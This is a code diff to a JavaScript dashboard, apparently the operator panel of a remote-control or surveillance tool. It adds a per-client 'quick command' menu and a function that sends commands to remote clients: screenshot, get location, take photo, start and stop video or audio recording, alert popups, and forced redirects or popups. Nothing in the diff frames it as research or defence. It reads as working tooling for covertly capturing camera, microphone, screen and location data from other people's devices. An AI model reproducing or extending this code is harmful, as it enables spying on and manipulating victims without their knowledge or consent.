@@ -1045,6 +1045,32 @@ function exportClient(clientId) {
     window.open('/api/client/' + clientId + '/export?token=' + AUTH_TOKEN, '_blank');
 }
 
+async function quickSendCmd(clientId) {
+    const sel = document.getElementById('qcmd-sel-' + clientId);
+    if (!sel) return;
+    const cmd = sel.value;
+    if (!cmd) { toast('⚠️ Select a command first'); return; }
+    let body;
+    if (cmd === 'alert') {
+        const msg = prompt('Alert message to show on client:');
+        if (!msg) return;
+        body = { clientId, command: 'alert', value: msg };
+    } else if (cmd === 'redirect' || cmd === 'popup') {
+        const url = prompt('URL:');
+        if (!url) return;
+        body = { clientId, command: cmd, value: url };
+    } else {
+        body = { clientId, command: cmd };
+    }
+    try {
+        await apiFetch('/api/command', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body) });
+        sel.value = '';
+        toast(`✅ Command "${cmd}" sent to ${clientId.slice(0,8)}…`);
+    } catch (e) {
+        toast('❌ Command failed: ' + e.message);
+    }
+}
+
 // keyboard shortcuts
 document.addEventListener('keydown', function(e) {
     if (e.ctrlKey && e.key === 'k') { e.preventDefault(); var s = document.getElementById('globalSearch'); if (s) s.focus(); return; }
@@ -1999,6 +2025,20 @@ function renderClients(clients) {
                     ${isPinned
                         ? `<button class="cl-action-btn" onclick="event.stopPropagation();unPinClient('${id}')" style="border-color:#553333;color:#aa5555">Unpin</button>`
                         : `<button class="cl-action-btn" onclick="event.stopPropagation();quickPin('${id}')">Pin</button>`}
+                </div>
+                <div class="cl-quick-cmd" onclick="event.stopPropagation()">
+                    <select id="qcmd-sel-${id}" style="font-size:.6rem;padding:2px 4px;border:1px solid var(--border2);border-radius:4px;background:var(--bg2);color:var(--text);max-width:110px">
+                        <option value="">⚡ Quick cmd</option>
+                        <option value="screenshot">📸 Screenshot</option>
+                        <option value="geolocation">📍 Get Location</option>
+                        <option value="photo">📷 Take Photo</option>
+                        <option value="startVideoRecording">🎥 Start Video</option>
+                        <option value="stopVideoRecording">⏹ Stop Video</option>
+                        <option value="startAudioRecording">🎙 Start Audio</option>
+                        <option value="stopAudioRecording">⏹ Stop Audio</option>
+                        <option value="alert">📢 Alert Popup</option>
+                    </select>
+                    <button class="cl-action-btn" style="font-size:.58rem;padding:2px 6px;margin-left:2px" onclick="event.stopPropagation();quickSendCmd('${id}')">Send</button>
                 </div>
             </div>
             ${photoH}
